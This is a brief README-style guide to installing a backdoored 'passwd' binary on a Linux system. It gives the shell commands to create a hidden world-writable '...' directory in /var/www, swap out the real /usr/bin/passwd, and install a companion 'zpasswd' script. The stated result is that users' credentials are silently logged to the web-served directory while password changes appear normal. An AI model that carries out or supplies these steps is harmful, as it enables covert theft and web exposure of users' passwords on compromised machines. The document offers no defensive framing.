This is a backdoored passwd

You must create a ... directory in /var/www

mkdir /var/www/...

Give it 777 permissions and owned by root

chown root:root /var/www/...
chmod 777 /var/www/...

Next, you might want to make backup of the original passwd binary

mv /usr/bin/passwd /usr/bin/passwd.orig

Move the backdoored passwd binary into /usr/bin

mv passwd /usr/bin

Make root own it and make 755 permissions

chown root:root /usr/bin/passwd
chmod 755 /usr/bin/passwd

Move the zpasswd python script into /usr/bin

mv zpasswd /usr/bin

chown root:root /usr/bin/zpasswd
chmod 755 /usr/bin/zpasswd

Now when people run passwd it will emulate the real binary behavior, add the credentials to /var/www/... and then change their password
